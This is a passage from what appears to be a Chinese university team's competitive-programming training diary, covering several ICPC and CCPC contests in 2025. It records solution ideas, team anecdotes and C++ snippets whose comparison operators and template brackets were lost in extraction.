,cnt,cnt + 1,cnt,1); else dfs (x - 2);++cnt; printf (POP %d GOTO %d; PUSH %d GOTO %d ,cnt,cnt + 1,cnt,cnt); 2025.05.26 The 2024 ICPC Southeastern Europe Regional Contest (SEERC 2024)做点欧洲的区域赛来换换脑子。 开局 Zlw 发现 A 是 $n^2$ 的做法，于是不需要换根 DP 直接暴力。我在看 D，感觉变种的 Nim 游戏并不是那么好做，但 Sky 发现后手是需要连续操作 $n$ 轮，与堆数相同，那么这道题瞬间变唐。于是立刻开写，但被全是 $0$ 的 corner case 淦了一发罚时。 在 A 通过之后，我发现 G 是一个简单 DP，直接开写，一发通过。之后 Sky 让我看看 J，如果是极值的情况答案很简单，然后发现如果是被最大最小值加在中间时，只需要多一次操作就能将其归约到前一种情况，于是火速过 J。Zlw 在想 L，猜了一个想法并手搓平衡树，竟然一发通过，不知道有没有想复杂。 大家一起看 H，猜测是贪心但是又有点不会证明。这时候 Zlw 想到了一个网络流做法并保证了正确性，由于我和 Sky 对这题都没啥想法，于是就让 Zlw 开写（因此也在与正解越走越晚）。好不容易写完以后，一交 TLE，这下完蛋，被 $m$ 很小的点卡了，也没法优化。好，这下被真的卡住了，已经将近 1.5 h 没有过题。 好在 Zlw 重新思考贪心做法，并用尝试优先队列去维护，在四小时不到一点的时候通过。我和 Sky 在开 K，我提出维护最初每一个字符所扩展到的区间 $l_i,r_i$，Sky 推了推发现是可维护的（虽然要分好几类）。但 Sky 并不是很擅长线段树，于是我先开始上机写区间加和乘，然后让他报给我区间更新的具体内容。本来是报着打完这道题还要调试一万年的，但是我稍微修改了一下我查询写挂的地方，之后竟然直接过样例。直接交！RE！噢是有个地方没开 long long！再交！AC！我们狂喜！ 还剩下 20 min，尝试开 C 交互，但是没啥想法，最后 7 题收尾！ C 从集合与集合之间的询问出发，通过二分找到能与集合连边的单点。具体来说，$L$ 与 $R = R_1 \\cup R_2$ 获得 $a + c$，然后二分右侧获得 $R_1,R_2$。之后进行进一步地询问，$L\\cup R_1$ 与 $R_2$ 询问获得 $b + c$，，$L \\cup R_2$ 与 $R_1$ 询问获得 $a + b$。若 $a + b + a + c = b + c$，则 $a = 0$，也就说明 $R$ 中只有 $R_2$ 与 $L$ 有直接连边。因此 $n$ 轮每次获得一个直接相连的点，询问次数在 $n + 2n \\log n$。 2025.05.27 The 2024 ICPC Central Europe Regional Contest开局 B,C,D 签到。然后看 L，搜索题的变种，一眼猜测需要再加一个维度表示朝向，但是不太想写，丢给 Zlw 了。 看 I，没想法；看 K，以为是构造，但是发现可能是搜索。发现奇数和偶数的位置一定有一种是需要全填的，但是剩余的位置还有 32 个，直接暴力不可过，于是开始各种乱搞。但是怎么尝试都 WA，于是开摆（ Sky 成功把 I 做出来了，真是太有实粒了！先入为主的会去想行与行之间的关系，可是如果考虑列，对于第 $i$ 个位置，进行变换 $k \\to k+1$，即 $S_k[i] = S_{k+1}[P(i)]$，将这条约束在 $k=1,2,\\ldots,k-1$ 都写出来： \\begin{pmatrix} S_1[i] \\\\ S_2[i] \\\\ \\vdots \\\\ S_{k-1}[i] \\end{pmatrix} \\to \\begin{pmatrix} S_2[P(i)] \\\\ S_3[P(i)] \\\\ \\vdots \\\\ S_k[P(i)] \\end{pmatrix}也就是说，用第 $1,\\cdots,k−1$ 轮的列向量去匹配第 $2,\\cdots,k$ 轮的列向量，贪心找最小值即可。 Zlw 继续开 F 数据结构，上机写着写着感觉太麻烦了，又开摆（ 最后 5 题收尾了（太累了，开启休整模式 qwq）。赛后还是看了下 K 别人的代码，发现就是疯狂减枝的爆搜，这种题都能上区域赛？有点离谱了！ 2025.05.29 The 2023 ICPC Asia Jinan Regional ContestD 签到，鹊巢原理之后就会异常好做(Zlw 佬一开始没看出来，差点写成数位 DP)。Sky 猜了一个 I 的结论，一发通过！我看 A，一下子没想法，和 Zlw 讨论了一下突然会了，只要贪心还原，然后只要有一个右括号的右侧存在一个左括号，并且中间是合法的即可。感觉很对，丢给 Zlw 去写了。 尝试看 K，猜想二分，但是 check 很难写。Zlw 佬看了题，一眼中位数最优，然后尝试用对顶堆去维护，似乎多了一个 $\\log$，但是好在一发通过！接着 Sky 喂给我一个 G 题的做法，直接上机写并查集，写完后 WA，我思考了一会儿想到 1010 1100 这种既互斥又互补的做法，本来想要特判，但是发现这是一类没有考虑到的情况。Zlw 即时的提出了这就是 2-SAT，直接上扩展域并查集即可。修了好久，总算通过了。其间红温了好久，下机缓了缓，而趁着这个时间他俩讨论出了 E 的网络流做法，并一发 AC，真的太有实粒了！ 最后开了 M，想到先求凸包，然后枚举一个基准点，用极角排序和双指针来维护答案，时间复杂度 $O(n^2 \\log n)$。想得非常正确，但由于对极角排序非常的不熟悉，用 atan2 超时了，然后想要改成叉乘却又发现不对，还剩一个小时但是也没调出来，成罪人了（ 好在六题收尾，并且只有一发罚时！ 赛后补题，发现 M 的致命错误： 制作模板的时候写的是 0-vector，而一开始自己写的却是 1-vector。 直接预处理了 atan2 后再排序，把超时问题解决了，这个函数是真的慢啊！！！ 判断点是否在三角形内用的是角度的做法，但是有精度误差导致一直 WA 掉。最后改成看穿入穿出的奇偶性之后就对了。 int in_Poly (vector Point P,Point A) int cnt = 0,n = P.size (); for (int i = 0;i n;++i) int j = (i + 1) % n; if (on_seg (A,P[i],P[j])) return 2;// on the edge if (A.y = min (P[i].y,P[j].y) A.y max (P[i].y,P[j].y)) // the intersection is on the right cnt += dcmp (((A.y - P[i].y) * (P[j].x - P[i].x) / (P[j].y - P[i].y) + P[i].x) - A.x) 0; return cnt 1; 2025.05.30 第九届中国大学生程序设计竞赛 桂林站（CCPC 2023 Guilin Site）省赛前最后一训！ G 题面写得实在有点一言难尽，读懂题目后发现是弱智题，速速通过。接着又很快的签完 M。 之后看了 K，发现 $n \\times m \\le 180$ 的数据范围很诡异，发现可以针对 $n$ 较小和 $m$ 较小写暴力，调了一会儿三发通过（之后看题解发现答案数量有限，直接用 map 跑暴力即可）。 之后看 B,C，发现都不好做，于是开始坐牢。B 的贪心情况很多，Sky 一直在红温，我和 Zlw 尝试做 C。C 的式子很是特殊，由于异或是不进位加法，所以 $\\operatorname{lcm} \\{a_{i_j}\\} \\mid \\bigoplus_{j=1}^m a_{i_j}$ 成立只有 $\\bigoplus_{j=1}^m a_{i_j} = 0$ 或 $\\bigoplus_{j=1}^m a_{i_j} = \\operatorname{lcm} \\{a_{i_j}\\} = \\max \\{a_{i_j}\\}$。对于第一种情况，直接跑线性基，答案为 $2^{n - r}$，$r$ 为秩。对于第二种情况，先用 $\\log$ 复杂度预处理每一个最大值的约数，然后两边同时异或上最大值就规约为第一种情况，再跑线性基即可，放个代码： int main () vector vector int d (200001); for (int i = 1;i = 200000;++i) for (int j = i;j = 200000;j += i) d[j].push_back (i); t = read (); while (t--) n = read (); vector int cnt (n + 1,0);Basis int basis (n,20); for (int i = 0;i n;++i) int x = read ();++cnt[x]; basis.modify (x); int ans = (qpow (2,n - basis.query ()) + MOD - 1) % MOD; for (int i = 1;i = n;++i) if (!cnt[i]) continue; int tot = 0; Basis int tmp (n,20); for (auto v : d[i]) if (cnt[v]) tmp.modify (v),tot += cnt[v]; ans = (ans + qpow (2,tot - tmp.query ()) % MOD) % MOD; printf (%d ,ans); return 0; 之后 Sky 尝试写 B，但是一直在调。我和 Zlw 讨论了 H 并得到了一个感觉相当正确的猜想。Zlw 还看了 I，不过没有什么非常好的想法。 打到后面稍稍有点累，于是 B 没调出来。H 我就最后 10 min 上机尝试写了一下，结果被 corner case 卡了。 屎到底还是要吃的。赛后 Zlw 看了 I 的题解恍然大悟，光速过题；Sky 在发现自己的程序被卡超时后好不容易改成 $\\log$ 并通过了 B；而我，在发现还要记录叶子节点上 $1$ 的个数（可以合成一个 $2$）后也通过了 H。 auto dfs = [] (auto self,int u,int fa) - void w[u] = a[u];one[u] = a[u] == 1; for (auto v : ve[u]) if (v == fa) continue; self (self,v,u); w[u] += w[v]; odd[u] = min (odd[u],odd[v]); even[u] = min (even[u],even[v]); one[u] += one[v]; if (w[u] 1) odd[u] = min (odd[u],w[u]); else if (w[u] != 0) even[u] = min (even[u],w[u]); if (w[u] k) return ; if (w[u] == k) ++ans,w[u] = one[u] = 0,odd[u] = even[u] = INF; else if (w[u] k) int del = w[u] - k; if (del % 2 == 1 odd[u] = del) ++ans,w[u] = 0,odd[u] = even[u] = INF; if (del % 2 == 0 (even[u] = del || one[u] = 2)) ++ans,w[u] = one[u] = 0,odd[u] = even[u] = INF; ; 害，只不过赛时啥实力不剩，只剩下红温了…… 2025.06.02 省赛 The 2025 Guangdong Provincial Collegiate Programming Contest出征省赛！深圳技术大学的校园真是开放，进出门完全没有人管，校园很大，而且厕所里有空调！ 进到机房以后，发现有 vscode，然后监考一会儿说可以用，一会儿又说不可以（笑话）。在延迟了 15 min 左右以后终于开始比赛，好在 PTA 这次没炸。 发现 D 是签到，Zlw 先敲了，然后发现 dev 的 -std=c++14 不能用，改成 c++11，仍然报错！好了，这下直接退化成 c++98，作为一个 auto 选手，直接倒闭（于是接下来，我都拒绝上机。 D 写完后，Sky 开始写模拟 F，写了几发都没过，于是 Zlw 先上机一发过了 G。然后我再听了 Sky 的思路以后，极不情愿的上机开始调，看了半天以后直接重构，一交继续 WA，想了一会儿以后发现思路有问题，加了一个贪心的排序以后再交，还是 WA！我开始红温，再看了很多遍以后发现有个地方忘记写 + 了，赶紧改，终于再 WA6 以后通过，成大罪人了。 之后是 H，发现贪心连边以后直接跑 DP 就能求出所有本质不同的子串，两发通过。然后看了 J，和 Zlw 简单对了思路以后发现用优先队列维护即可。由于我不想再上机写代码，于是继续 push 了 Zlw。 还有将近两小时，看 I，我先想了大概的思路，但是要上机敲代码的时候发现漏考虑了容斥的部分情况。于是 Zlw 继续发力，提出直接暴力考虑三列的情况。写了半天在还有不到半小时以后过了样例，直接交！WA！ 坏了，继续调试，发现写得似乎都没问题，继续交了几发，一直到赛后也没过……五题收尾！ 本来以为只有 Cu，后来发现 Ag 的比例也有 $20\\%$，最后 rk62 Ag（还被另一支校队伍从 $4 \\to 6$ 翻盘，真的是不封榜不会写代码了）。 赛后补题： I 发现看错题了，有一只队伍需要强制选择，而我们在一次次转述题意之后出现了差错，导致没过题的惨剧。也就是说，我们的方法做成了更加复杂的版本，因此我加了点补丁以后直接过了。 A Zlw 的思路大致正确，于是赛后交了几发以后通过。其间 WA 时因为某些 long long 和 int128 的问题，最后跪着接（`#define long long int128`） 就过了。 我补了 K，直接上哈希。发现答案递增，然后用哈希判断回文，用哈希和等比数列公式验证是否存在循环节。直接枚举答案以及 $[1,i]$ 的询问即可。 Hash dl (s);reverse (s.begin (),s.end ());Hash dr (s);for (int i = 1;i = n;++i) auto check = [] (int x) - bool if (x == 1) return dl.get (1,i) == ((dl.get (1,1) * (Z ll,MOD (1) - dl.get_pw (i))) / (Z ll,MOD (1) - base)); if (x * 2 - 1 = i) Z ll,MOD dx = dl.get (2 * x - i,x),dy = dr.get (n - i + 1,n - x + 1); return dx == dy; int r = x * 2 - 1; Z ll,MOD dx = dl.get (1,r),dy = dr.get (n - r + 1,n); if (dx != dy) return false; --r; dx = dl.get (1,r) * (Z ll,MOD (1) - (dl.get_pw (r) ^ (i / r))) / (Z ll,MOD (1) - dl.get_pw (r)); dx = dx * dl.get_pw (i % r) + dl.get (1,i % r); return dx == dl.get (1,i); ; for (int j = res;j = i;++j) if (check (j)) res = j;break; ans ^= 1ll * i * res; 8-9 月训练2025牛客暑期多校训练记录 2025.08.30 CCPC 2023 Harbin SiteD,G 被 Zlw 秒了，J,M 被 Sky 秒了，B,L 被 Zlw 救了！ B 看上去是签到，我先上机开写。注意到了多次除以 $2$ 有可能会造成精度问题，所以就加了个 eps。但是交上去还是 WA 了，这时候被 Zlw 救救，说可以把除以 $2$ 移项改为乘 $2$，然后用 Python 来写。我果断采取建议，修改后通过！ 接下去 M 是一道简单模拟，就交给 Sky 来写。花了 20 min 左右，过样例以后一发通过。 我接下去看了 L，想到可以固定第一位数，然后后面的数通过 2 操作在转，类似插入排序的原理。但是在实现上出现了问题，没有考虑到第一个位置数的顺序问题从而无法正确排序。 Zlw 上来就在看 D，一道数论和图论的结合题。佬在想明白只需要考虑价值为 $\\omega(w)$ 和 $\\omega(w + 1)$ 的边以后就会了，预处理后直接最小生成树即可。后来看了 XCPC board，发现差一发就是一血，是一道 Au 题！ 写完 D 后 Zlw 佬看我红温了，于是交流了一下指出我的问题，并把我踹下去重新实现了。 我和 Sky 开始讨论 J 博弈论。Sky 首先列出了很大的一张表格，尝试去找规律。然后我对于一棵树，根据奇偶性，提出了点奇数删边，偶数边删点的猜想。但是在由树变为森林的时候，两条链（3 + 2）构成的情况的答案数量产生了疑问，似乎在一定程度上需要把猜想反过来。 继续手动模拟 SG 函数，突然发现偶数边偶数点的情况下答案都是 $0$，又试了几个确定了这个猜想。于是题目变成分类讨论度数即可。 我们卡 G 也有点时间，然后我突然点出墙体只有竖着的，于是简化了问题。主要是连续两行之间的合并，利用双指针就能实现，然后最后只需要根据边数和点数判断是否为一棵树即可。注意，$n \\ge 2 $ 时 $m 2 \\times 10^5$ 显然为 No，但是 $n = 1$ 时需要特判。于是我们在这里挂了一发。 总体来说这场打得不错，对照着 XCPC board 似乎差三名就能 Au，怪我 L 写得慢还写红温了…… 2025.08.31 CCPC 2023 Qinhuangdao SiteA 是简单构造，花费 2 s 想到解法，全部可以构造成互质的情况，但是第一发 WA。先让 Sky 来写 G，答案就是 $\\sum \\limits_{i = 2} ^ n |a_i - a_{i - 1}| + |b_i - b_{i - 1}|$。 然后发现 A 题目保证 $k \\ge 2n$ 但是我只用了 $2n - 1$ 个，发现没有保证第一个数和最后一个数的行列都至少有两个数字，修补一下就过了。 Zlw 看了 J，是一道简单子集枚举的状压，时间复杂度为 $O(3^n + n2^n)$。 接下来两小时内无人过题…… D 被 Zlw 想到了一个 DP，然后用双指针和平衡树在维护，感觉很是复杂。提交了好几遍都没过，对拍还没拍出来。然后 Sky 还开了 F，要求相邻两数得是质数，然后注意到 $1 + 1 = 2$ 这个质数比较特殊，接下去没什么进展。 然后我突然灵光一现，想到了 D 可能是个贪心。由于优惠券可以叠加使用，可以先将优惠券按照过期时间排序，然后对于当前优惠券，选择 $[1,r_i]$ 范围内 $a_i$ 最小的那个，然后 $a_i \\leftarrow a_i - w_i$，最后直接对 $a_i$ 排序即可。于是上机写，让 Zlw 去看 Sky 的题。 我在写的时候，Zlw 提出一个 DP 的写法，$dp_{i,0/1/2/3}$ 表示填第 $i$ 个数时，$i$ 改为偶数，不为 $1$ 的奇数，为 $1$，不变这四种情况，然后就能够转移。 D 对于更新 $a_i$ 没啥好的想法，直接上线段树进行更新，写完以后一遍过样例，直接交，终于 AC！ Zlw 的 F 也过样例了，但是 WA。叫我过去瞅瞅，一行行给我翻译，然后我突然发现有一种情况转移的时候漏掉了固定为 $1$ 的情况，修改以后直接通过。 接下去看了 M，但是没啥想法，于是下班。事实证明，全队的树形 dp 不太行（牛客的时候遇到树形 dp 的中档题也没解出来）。最后 $5$ 题，但是我们的 DF 都是三小时的时候才过，于是在 XCPC board 上只能排到 Cu！ 2025.09.05 The 15th Shandong CCPC Provincial Collegiate Programming Contest临时加训了一场简单的 SUA 省赛场，用来增强信心！Zlw 佬还在赛时秒了 E，一开始 TLE，稍微优化了一下就过了，结果还是一血来着！ 网络预选赛2025.09.07 The 2025 ICPC Asia East Continent Online Contest (I)赛时 6 题，最后两小时有点倒闭，没有过题，在同校中排 rk3（由于前期光速过题，我们是六题队在排在前面的。但是非常可恶，被牢周队在封榜以后反超了）。 G 签到，其实是 Sky 做出来的，一开始 Zlw 以为连通就可以，但是突然发现小的数会卡在前面阻止别人交换。Sky突然说必须要连 $1\\rightarrow 2\\rightarrow\\cdots\\rightarrow n$，Zlw 觉得有道理，但是由于数组开小了段错误了一发。 接着 A 大模拟，趁着队友上机仔细想了细节，后来上机一发过，这是好的！ 刚下机队友就发现 B 是个大诈骗，发现 $\\gcd$ 的可能结果是 $n$ 的约数，理论上可以枚举，然后计算每个 $\\gcd$ 的方案数。一开始看错题了以为 $a$ 是给定的，后面发现 $a_i=i$，突然想到对于每一个约数的同余结果是相同的，在想容斥的过程中突然发现只要连续的删除数对于结果的影响理应是相同的。所以直接删 $[1,K]$ 理论可行。验证了一下确实与样例结果相同，提交了一下过了。直接输出 $1 \\sim k$ 就过了！ 接下去队友发现不太会 D，于是 Zlw 开始尝试看。他俩开始讨论 M，很明显的分层图最短路，只不过 $O(nm(\\log n+\\log m))$ 的复杂度很劝退。进一步发现可以一层层转移，每一层只需要考虑树上的松弛操作，很容易跑不满，加上单层转移的时候可以做到 $O(nm\\log n)$ ，比上面的复杂度稍有优化，且常数小不少，写了一下 $0.9s$ 跑过。写完以后 pta 在队长机上崩了一会儿，自带罚时，捣鼓两分钟以后才交了上去，好在一发通过。 D 我觉得可能是贪心，考虑链的情况，如果出现峰值，就把差值绝对值小的一边删掉。可是想了一会儿发现 5 3 9 1 的情况会把 $3$ 的两条链全都删掉，看来贪心不太对。 然后队友看了 I，突然冒出来一堆人通过，于是看了一眼。通过奇妙证明发现，变向不会使得答案变大，于是反过来说变向也不会使得答案变小，于是正反向答案不变。结合大量的通过人数进一步验证，于是从 $T$ 出发跑最短路即可。 D 依旧倒闭，三个人都想过了还是不太行。于是看看 C，感觉很贪，一开始想要从小区间扩展到大区间，但是发现 $[1,2],[4,5],[2,4]$ 这组数据可以 hack 掉。Zlw 开始发力！一开始又读错题以为 $a$ 是给定的，直到看到 $1\\leq n\\leq 10^9$ 才发现又是 $a_i=i$。于是变得非常可做，大部分赋值都会使得答案 $-1$。从左到右考虑区间，进一步发现在原本选定的赋值方案后，可以通过在实际上倒着操作来构造合法方案。然后通过各种手玩发现按照 $(r,l)$ 升序排序会比较好处理。问题转化为一个贪心，用 set 分区间维护未删除的点，找到 $\\geq l$ 的第一个未删点分配给区间即可。我想了想，感觉很对，于是他又上机写，一发通过！！！！ 他俩看了看其它题，D 依旧放着。发现 F 是个好玩的交互，提出了可以一个隔一个的防御，于是 Sky 开始执笔迷题。 至于 D，开局只有队长机能登录，一题题速览，Zlw 看到 D 题题面较短，很快读完发现是个树树题，于是 Zlw 就先到旁边想了，在可以跟榜前没有任何思路，等到发现 G 有人过了就先扔了 D。结果一直到最后卡题的时候才由 Scy 提出了一个神妙贪心，对于一个节点，与下面的节点合并只有三种方式，从头合并，从尾合并以及中间合并。联想到可以分开算贡献，只考虑每一对父亲儿子的贡献即可。但是最后 dp 的时候发现一个后缀和处理错误，以及在考虑两条链合并的时候没有加入其它儿子的贡献，赛时直到最后都没有做出来。 但是写完由于一些神秘的 bug，导致到最后都没过。最后半小时 Sky 还来尝试了 F，但是由于细节太多，这题也没过。最后总排 309，遗憾离场了！ 【Scy の补题】 让我们来完整的重新复现一下 D 的思路以及最后的死亡回放： 改完以后就 AC 了，警钟长鸣。 令 $dp_{u,0/1/2}$ 表示 $u$ 点放到中间，放到右侧，放到左侧时 $u$ 子树内的答案。让我们先来分析一下几种情况。 $dp_{u,1}$ 的更新相当于一个原来为向右的箭头，$a_v$ 在最右侧。当 $a_u a_v$ 时，对 $dp_{u,1}$ 的额外的贡献为 $a_u - a_v$，否则为负贡献。 $dp_{u,2}$ 的更新同理，其中正的额外贡献为 $a_v - a_u$。若出现负贡献，实际上会在另一种情况中变为正的贡献。 $dp_{u,0}$ 稍微复杂一点，分为四种情况： $\\rightarrow u \\leftarrow$ 且两个箭头不重叠，这一段的贡献更新为 $dp_{k1,1} + dp_{k2,2} + w_{k2} - w_{k1}$。 $\\rightarrow u \\leftarrow$ 且两个箭头重叠，这一段的贡献更新为 $dp_{k1,1} + dp_{k2,2} -(w_{k1} - w_{k2})$，减去的就是重叠的那一部分，改为加号其实和第一种情况表达式一致。 $\\leftarrow u \\rightarrow$ 且两个箭头是否重叠均可，此时 $dp_{u,0}$ 无法处理贡献，但是该情况会被归类为 $dp_{u,1/2}$。 综上所述则有 \\begin{cases} dp_{u,1} = \\max \\limits_{k \\in son_u}\\left\\{\\sum \\limits_{v \\in son_u \\mid v eq k} \\max \\{dp_{v,0},dp_{v,1},dp_{v,2}\\} + dp_{k,1} + w_u - w_v\\right\\}\\\\ dp_{u,2} = \\max \\limits_{k \\in son_u}\\left\\{\\sum \\limits_{v \\in son_u \\mid v eq k} \\max \\{dp_{v,0},dp_{v,1},dp_{v,2}\\} + dp_{k,2} + w_v - w_u\\right\\}\\\\ dp_{u,0} = \\max \\limits_{k1,k2 \\in son_u\\wedge k1 eq k2}\\left\\{\\sum \\limits_{v \\in son_u \\mid v eq k1 \\wedge v eq k2} \\max \\{dp_{v,0},dp_{v,1},dp_{v,2}\\} + dp_{k1,1} + dp_{k2,2} + w_{k2} - w_{k1}\\right\\}\\\\ \\end{cases}对于 $dp_{u,0}$ 的更新，直接做是 $O(n^2)$ 的，但是我们可以预处理 $dp_{k2} + w_{k2}$ 前后缀最大值，这样就可以在 $O(n)$ 的时间内更新完。于是这道题做完了，最后时间复杂度为 $O(n)$，代码如下： int main () int n = read (); vector int a (n + 1); vector vector int ve (n + 1); vector vectorll dp (n+1,vectorll(3,0)); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i n;++i) int u = read (),v = read (); ve[u].push_back (v);ve[v].push_back (u); auto dfs = [] (auto self,int u,int fa) - void vector ll pre (ve[u].size (),0),suf (ve[u].size (),0); ll mx1 = -1e18,mx2 = -1e18;int c = 0; for (auto v : ve[u]) if (v == fa) continue; self (self,v,u); ll gv = max (dp[v][0],dp[v][1],dp[v][2]); mx1 = max (mx1,dp[v][1] + (a[u] - a[v]) - gv); mx2 = max (mx2,dp[v][2] + (a[v] - a[u]) - gv); pre[c] = suf[c] = dp[v][2] + a[v] - gv; dp[u][1] += gv,dp[u][2] += gv,dp[u][0] += gv; ++c; dp[u][1] = max (dp[u][1],dp[u][1] + mx1); dp[u][2] = max (dp[u][2],dp[u][2] + mx2); --c; for (int i = 1;i = c;++i) pre[i] = max (pre[i],pre[i - 1]); for (int i = c - 1;i = 0;--i) suf[i] = max (suf[i],suf[i + 1]); int cc = 0;ll res = 0; for (auto v : ve[u]) if (v == fa) continue; ll mx = -1e18,gv = max (dp[v][0],dp[v][1],dp[v][2]); if (cc) mx = max (mx,pre[cc - 1]); if (cc != c) mx = max (mx,suf[cc + 1]); res= max (res,dp[u][0] + dp[v][1] - a[v] + mx - gv); ++cc; dp[u][0] = res; ; dfs (dfs,1,0); printf(%lld ,max(dp[1][0],dp[1][1],dp[1][2])); return 0; 【Sky の补题】 题目大意很简单，就是一个棋盘，我先手，一次可以随便下一个位置，然后机器人有一个初始位置，一次可以往八个方向随便走一格，目标就是堵住机器人。 注意到题目给了最大步数限制 $T=1000$，以及机器人最大初始位置 $(20, 20)$，考虑建一堵横着 $30$，竖着 $30$ 的墙，把机器人围在墙内，然后在里面随便填，最多也就 $30 \\times 30=900$ 步（现在想了下好像都不用 $30$ 那么远，但赛时为了方便就直接选了 $30$）。 我们先手，是个很有用的条件，如何利用好这个条件是解体的关键。当然，开局要先堵 $(30,30)$，这个其实比较神秘，因为开局不知道机器人怎么走的话，堵其他地方都会浪费。 在草稿纸上玩了半个小时后，发现如果机器人离边界比较远的话，其走的八个方向可以分为四类： 左、左下、下。这一类不会威胁我建墙，随便建即可。 左上、上。这一类会威胁我建上面的墙，我需要在机器人当前坐标的正上方（顶到 $30$）的左边两格建墙。 右下、右。这一类会威胁我建右边的墙，同理，我需要在机器人当前坐标的正右方（顶到 $30$）的下面两格建墙。 右上。这是威胁最大的，同时影响我建上面和右边的墙，所以我记录一个布尔变量 $tf$，用于轮流建上面和右边的墙。 当然，如果这种方式需要建的墙被堵住了，在它旁边能建的位置建一个就好了，反正要尽快建墙。 但是，如果机器人走到离边界比较近的地方，具体就是差 $2$ 格的位置，我们就要考虑结合上面的策略，不要让机器人走出去。 比如上图这种情况，我们的上面的策略其实是可以保证机器人快到边界的时候，不会出现它能到达的五个边界格子 $(4,30),(5,30),(6,30),(7,30),(8,30)$ 有三个连续空缺的情况，这种情况聪明的机器人肯定能走出去。那么假设遇到了上图这种漏洞比较大的情况，我们肯定要优先堵住 $(6,30)$，然后根据它的移动再去堵下一个。 我们要保证一个事情：机器人离下边界的时候只有 $2$ 格的时候，它的正下方及周围一共五个格子，必须有至少两个是填上的；以及，机器人离下边界只有一个格子的时候，它的正下方及周围一共三个格子，必须有至少两个是填上的（这个好理解）。 然后墙就建完啦！剩下的就是把机器人围在墙里面，一点一点堵死，感觉机器人应该会很兴奋吧！😋 2025.09.14 The 2025 ICPC Asia East Continent Online Contest (Ⅱ)C 看了一眼 Zlw 和 Sky 都认为是签到，按照套路先二分，然后尝试贪心分配。发现可以封装一个函数从小到大硬分配每一种题目，然后中间分类讨论如何把前面的东西补到后面然后再用之前那个函数补齐前面，分类讨论少了一点，大概 30 分钟写完。 接下来是 D 题。 【Sky 推柿子】考虑一个子序列的元素被一个一个卖掉所能得到的最大价值是，先将子序列从小到大排序（$a_1$ 到 $a_n$），然后从后往前卖，这样后面大的价值可以累积到前面，我们会得到最大价值： W_i = a_1 + a_2 + 2 a_3 + 2^2 a_4 + \\cdots 2^{n-2} a_n然后我们先将原本给定的序列排序，对于所有子序列，只需要考虑 $a_i$ 作为子序列的第 $j$ 个数的贡献。Zlw 佬推了一下式子发现总的答案就是 \\begin{align} W &= \\sum_{i=1}^n \\left( \\sum_{j=2}^i \\binom{i - 1}{j - 1} \\cdot 2^{j-2} \\cdot 2^{n-i} + 2^{n-i} \\right) \\\\\\ &= \\sum_{i=1}^n 2^{n-i} \\left( \\sum_{j=2}^i \\binom{i - 1}{j - 1} \\cdot 2^{j-2} + 1 \\right) \\\\\\ &= \\sum_{i=1}^n 2^{n-i} \\cdot \\left( \\frac{3^{i-1}-1}{2}+1 \\right) \\\\\\ &= \\sum_{i=1}^n 2^{n-i} \\cdot \\frac{3^{i-1}-1}{2} \\end{align}这里要注意两个细节： 一个是最大价值序列的系数并不是一个 $2^i$ 的序列，其第一项和第二项都是 $1$，在计算答案的时候要处理一下。 第二个就是二项式定理，要确保不算错。 【Zlw 推柿子】尝试计算 $a_i$ 在最终答案中的出现次数。可以枚举 $a_i$ 在答案中的排名 $r$，相同 $a_i$ 约束为按原序列的顺序即可。得到： f_i=[\\sum_{i=2}^{r} \\binom{r-1}{i-1}2^{n-r}\\times 2^{i-2}]+2^{n-r}=2^{n-r}\\times(\\sum_{i=0}^{r-1}(\\binom{r-1}{i}2^{i-1})-\\frac{1}{2})+1)=2^{n-r}\\frac{3^{r-1}+1}{2}然后乘上系数加起来即可。 我在看 E，看着 $n,m$ 均为 $10^9$ 的数据产生了疑问，趁着空机的时候敲了暴力 dfs。很快就发现 $n$ 为奇数的时候答案为 $(2^m - 1)^{n - 1}$，但是偶数的时候没发现规律。Zlw 看了一眼奇数的答案然后尝试猜测含义，$n - 1$ 个数随便填，然后用最后一个数去修正。偶数似乎会遇到相邻重复的问题。于是我灵光一现，尝试用奇数规律的答案和正确答案作差，还真给我找到规律了！偶数时候的答案为 $(2^m - 1)^{n - 1} + (-1)^{\\frac{n}{2}} \\times (2^m - 1)^{\\frac{n}{2}}$。哦，还要特判 $n = 2$ 时答案为 $0$。于是乎这题被我猜完了，提交一发通过。 H 题 Zlw 看了很久终于看懂题了，然后发现其实可以强制链头链尾改变，然后算每个长度的链有多少条就可以。但是感觉思路很简单，跟树没什么关系，然后中间清空写挂了一个 corner case 一直没发现，红温了很久。还贡献了两罚时 + 40 min 思考时间（这也导致我们比另外一个队罚时多了 2 min）。 I 题 Zlw 开局有点看错题，以为可以直接问 $(1,n,1)$，后来发现询问出来的式子形如 $zf_1+z^2f_2+z^3f_+\\cdots +z^{n-1}f_{n-1}$，但是并未想打拉格朗日插值，只想到也许可以高斯消元。Sky 尝试根据图上的情况寻找方案但是失败了，于是 Sky 去和 Scy 看计算几何去了。从高斯消元的思路出发，尝试通过 $n-1$ 次询问特殊的 $z$ 从而能够 $n^2$ 消元。最终在系数矩阵上发现了规律，由于最终只关心最后一个式子的结果，可以计算从 $n-1$ 个式子凑最后给定式子的值，于是可以把矩阵旋转求 $n-1$ 个系数。此时的矩阵第 $i$ 列形如 $\\vec a=[a_i,a_i^2,a_i^3,\\cdots,a_i^{n-1}]$，令第 $j$ 行式子为 $f_j$，对每个 $i$ 做差分 $f_j\\leftarrow f_j-a_i\\times f_{i-1}$ 即可消出上三角矩阵，每一项呈现下降幂的形式。如果询问 $1$ 到 $n-1$ 则会使得上三角的 $a_{i,j}=A(j,i)$。然后对上三角直接消元即可 $n^2$ 得到系数了。 但是赛时写错了 $A^m_n$ 的公式，找 Sky 验证还说没问题，以为真没问题。以及差分的时候每次只用差分 $n-i+1$ 项，结果我全部差分了，后面数组还搞错了一个地方。但是沙比交互库 WA 返回 RE，最后时间紧只测了一个手搓的样例，以为只是哪里不小心 RE 了一直疯狂提交直到发现是感叹号之后 RE 了，一直没有认真调试，以后交互题不能相信交互库返回的结果。 A 题其实不难，但是因为是计算几何，一开始就直接跳过了，最后一个小时才开始认真看，结果最后因为一点点小细节没有 AC。 题目大意是给定 $z$ 平面上几个点，每个点都可能有半径为 $R_2$ 的误差，然后有个半径为 $R_3$ 的球体小鸟，中心在 $z$ 平面上，可以在给的几个点之间随便游走，求小鸟游走可能最大的凸包体积。 稍微画几个图就会发现其实就是，直接先求原来几个点的平面凸包，然后凸包最外围延申 $R_2$ 的长度，端点处就是圆形平滑曲线。样例给的图挺好的。然后到三维就是刚才这个围起来的曲线边缘变成半径为 $R_3$ 的半球形，高度为 $2R_3$ 的立体图形。样例如下图所示，就是求这玩意的体积： 赛时 Sky 